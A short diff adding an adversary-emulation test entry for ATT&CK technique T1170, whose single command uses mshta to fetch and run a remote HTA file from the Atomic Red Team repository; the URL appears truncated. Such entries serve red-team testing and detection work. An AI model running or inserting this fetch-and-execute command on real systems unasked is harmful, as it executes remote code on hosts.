@@ -1,0 +1,14 @@
+---
+
+- id: tacmulti-1170-AR03-1v00-200120184608
+  name: Mshta Executes Remote HTML Application (HTA)
+  description: .      Execute an arbitrary remote HTA..  
+  tactic: multiple
+  technique:
+    attack_id: T1170
+    name: Mshta
+  platforms:
+    windows:
+      cmd:
+        command: |
+          mshta https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/T1170.ht
